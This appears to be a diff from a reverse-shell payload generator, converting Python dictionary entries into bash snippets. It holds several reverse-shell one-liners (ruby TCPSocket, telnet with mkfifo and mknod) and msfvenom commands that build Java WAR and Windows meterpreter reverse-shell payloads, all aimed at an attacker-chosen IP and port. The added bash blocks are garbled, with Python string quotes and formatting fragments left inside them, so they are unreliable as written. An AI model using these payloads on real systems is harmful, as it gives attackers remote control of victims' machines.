@@ -176,8 +176,23 @@ ruby -rsocket -e \'c=TCPSocket.new("%s","%d");while(cmd=c.gets);IO.popen(cmd,"r"
 'rm -f /tmp/p; mknod /tmp/p p && telnet %s %d 0/tmp/p' % (ipaddr, port),
 
 
-        'telnet-mkfifo':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %d > /tmp/f' % (ipaddr, port),
-        'war':'msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (ipaddr, port),
-        'win-bin':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
-        'xterm':'xterm -display %s:1 \n\n[+] Connect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr)
-    }
+```bash
+Telnet - mkfifo
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet %s %d > /tmp/f' % (ipaddr, port),
+```
+
+```bash
+# WAR
+msfvenom -p java/shell_reverse_tcp LHOST=%s LPORT=%d -f war -o revshell.war' % (ipaddr, port),
+```
+
+```bash
+# WIN - bin':
+'msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%d -f exe > revshell.exe' % (ipaddr, port),
+```
+
+```bash
+# xterm':'
+xterm -display %s:1 \n\n[+] Connect to your shell with:\n\nXnest :1 or xhost +targetip' % (ipaddr)
+```
+
